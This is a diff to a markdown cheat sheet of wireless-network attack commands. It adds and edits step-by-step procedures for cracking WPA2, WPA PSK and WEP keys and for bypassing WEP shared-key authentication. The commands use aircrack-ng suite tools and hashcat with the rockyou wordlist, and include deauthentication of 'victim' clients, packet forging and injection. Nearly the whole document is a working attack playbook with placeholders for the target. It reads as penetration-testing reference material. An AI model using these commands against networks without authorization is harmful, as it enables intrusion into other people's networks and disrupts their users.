@@ -8,7 +8,7 @@ description: Oldie but a goodie
 
 ### Cracking WPA2
 
-```text
+```bash
 # put your network device into monitor mode
 airmon-ng start wlan0
 
@@ -38,12 +38,12 @@ capx.bin capture/-01.cap capture/-01.hccapx
 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 
 ########## crack password with hashcat ##########
-# hashcat64.exe -m 2500 cap.hccapx rockyou.txt -r rules\<rule> 
+hashcat64.exe -m 2500 cap.hccapx rockyou.txt -r rules\<rule> 
 ```
 
 ### Cracking WEP with Open Authenitcation Clients
 
-```text
+```bash
 ########## Cracking WEP With Clients (open authentication) ########## 
 #enter monitor mode
 airmon-ng start wlan0 <AP Channel>
@@ -72,7 +72,7 @@ aircrack-ng -0 <filename>
 
 ### Cracking WEP Via Client
 
-```text
+```bash
 ########## Cracking WEP Via Client ########## 
 #enter monitor mode
 airmon-ng start wlan0 <AP Channel>
@@ -98,7 +98,7 @@ aircrack-ng -0 -z -n 64 <file-name>
 
 ### Cracking Clientless WEP 
 
-```text
+```bash
 ########## Cracking WEP without Clients ########## 
 #enter monitor mode
 airmon-ng start wlan0 <AP Channel>
@@ -116,21 +116,70 @@ aireplay-ng -5 -b <AP MAC> -h <wlan0 MAC> wlan0
 packetforge-ng -0 -a <AP MAC> -h <wlan0 MAC> -k <Dest IP/Local Broadcast IP> -l <Source IP> -y <xor file> -w <output file>
 
 #inject crafted packet to recieve IV
-aireplay-ng -2 -r <inject file> wlan0
+aireplay-ng -2 -r <packetforge inject file> wlan0
 
 #time to crack WEP Key
-aircrack-ng <capture file .cap>
-
-##Option 2: KoreK ChopChop (tends to work when frag attack does not, but takes longer) 
+aircrack-ng -0 <capture file .cap>
+ 
+#Option 2: KoreK ChopChop (tends to work when frag attack does not, but takes longer) 
 aireplay-ng -4 -b <AP MAC> -h <wlan0 MAC> wlan0
 
 #create arp request packet
 packetforge-ng -0 -a <AP MAC> -h <wlan0 MAC> -k <Dest IP/Local Broadcast IP> -l <Source IP found in KoreK attack> -y <xor file> -w <output file>
 
 #inject crafted packet to recieve IV
-aireplay-ng -2 -r <inject file> wlan0
+aireplay-ng -2 -r <packetforge inject file> wlan0
 
 #time to crack WEP Key
-aircrack-ng <capture file .cap>
+aircrack-ng -0 <capture file .cap>
+```
+
+### Bypassing WEP PSK
+
+```bash
+########## Bypassing WEP Shared Key Authentication ########## 
+#enter monitor mode
+airmon-ng start wlan0 <channel>
+
+#capture dump of target AP  
+airodump-ng -c <channel> --bssid <AP MAC> -w <file-name> wlan0
+
+#deauth a connected client
+aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0
+
+#shared key fake auth attack
+aireplay-ng -1 6000 -e <ESSID> -y <sharedkey .xor> -a <AP MAC> -h <wlan MAC> wlan0
+
+#ARP request replay attack
+aireplay-ng -3 -b <AP MAC> -h <wlan0 MAC> wlan0
+
+#deauth a connected client
+aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0
+
+#time to crack WEP Key
+aircrack-ng -0 <capture file .cap>
+```
+
+### Cracking WPA PSK
+
+```text
+########## crack WPA PSK ########## 
+# put your network device into monitor mode
+airmon-ng start wlan0
+
+# if channel needed
+airmon-ng start wlan0 <channel number>
+
+# listen for all nearby beacon frames to get target BSSID and channel
+airodump-ng mon0
+
+# start listening for the handshake
+airodump-ng -c 6 — bssid <AP MAC> -w capture wlan0
+
+#deauth a connected client to force a handshake
+aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0
+
+#crack with aircrack-ng
+aircrack-ng -w <wordlist> <WPA PSK capture .cap>
 ```
 
